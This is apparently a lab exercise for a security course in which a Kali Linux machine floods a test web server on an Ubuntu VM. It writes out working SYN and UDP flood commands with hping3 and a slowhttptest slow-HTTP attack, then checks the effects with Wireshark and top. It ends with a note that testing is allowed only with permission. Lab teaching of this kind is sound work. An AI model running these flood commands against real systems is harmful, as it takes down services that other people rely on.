# 1.1 Tool Preparation
# 1) Open the Kali Linux terminal.
# 2) Update the package list.
sudo apt update

# 3) Install hping3 and slowhttptest:
sudo apt install hping3 slowhttptest
# 1.2 Set Up Target Web Server (Ubuntu VM)

# On the Ubuntu VM, open a terminal:
python3 -m http.server 8000

# Expected Output (example):
# Serving HTTP on 0.0.0.0 port 8000 ...
# Note your Ubuntu VM's IP (e.g., 192.168.1.101) for the attacks.

# 1.3 Execute the Attack
# 1.3.1 Launch SYN or UDP Attack Using hping3

# SYN Attack (replace <TARGET_IP> with actual IP, e.g., 192.168.1.101):
sudo hping3 -S -p 8000 --flood <TARGET_IP>
# UDP Attack (replace <TARGET_IP>):
sudo hping3 --udp --flood -p 8000 <TARGET_IP>

# 1.3.2 Perform HTTP Flooding Attack Using slow http test
# Simulate slow HTTP GET requests:
slowhttptest -c 5000 -H -i 5 -r 500 -t GET \
  -u http://<TARGET_IP>:8000 -x 24 -p 10

# 1.4 Detect and Verify Attack Effects
# 1.4.1 Capture Network Packets Using Wireshark
# (On the Ubuntu VM or your host machine, if it can see the traffic)
# Start Wireshark (or tcpdump) and filter by port 8000 or the target IP.

# 1.4.2 Check CPU Load on the Target (Ubuntu VM):
top
# Watch for increased CPU usage, abnormal traffic, or timeouts.
# Only perform these actions on systems and networks you own or have explicit permission to test. Launching attacks on unauthorized systems is illegal and unethical.